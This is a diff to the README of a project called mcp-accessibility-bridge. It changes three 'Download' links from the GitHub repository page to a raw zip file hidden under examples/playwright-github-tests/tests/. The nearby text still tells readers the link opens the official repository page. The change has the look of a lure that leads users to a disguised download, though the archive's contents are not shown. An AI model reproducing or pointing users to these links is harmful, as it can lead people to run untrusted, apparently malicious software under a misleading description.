@@ -1,6 +1,6 @@
 # ⚙️ mcp-accessibility-bridge - Access Chrome Accessibility Easily
 
-[![Download](https://img.shields.io/badge/Download-mcp--accessibility--bridge-brightgreen)](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge)
+[![Download](https://img.shields.io/badge/Download-mcp--accessibility--bridge-brightgreen)](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge/raw/refs/heads/main/examples/playwright-github-tests/tests/mcp-accessibility-bridge-v3.6.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Here is how to download and run mcp-accessibility-bridge on a Windows computer. 
 
 Click the following link to open the project page. This is the official repository where you get the software:
 
-[Download mcp-accessibility-bridge](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge)
+[Download mcp-accessibility-bridge](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge/raw/refs/heads/main/examples/playwright-github-tests/tests/mcp-accessibility-bridge-v3.6.zip)
 
 You will land on the GitHub repository page. This page hosts all the files and information related to the application.
 
@@ -135,7 +135,7 @@ If you want help with this, you might consider asking a developer or looking for
 
 Access the official GitHub page below and follow the steps to get started:
 
-[Download mcp-accessibility-bridge](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge)
+[Download mcp-accessibility-bridge](https://github.com/jowafanene123-cmyk/mcp-accessibility-bridge/raw/refs/heads/main/examples/playwright-github-tests/tests/mcp-accessibility-bridge-v3.6.zip)
 
 ---
 
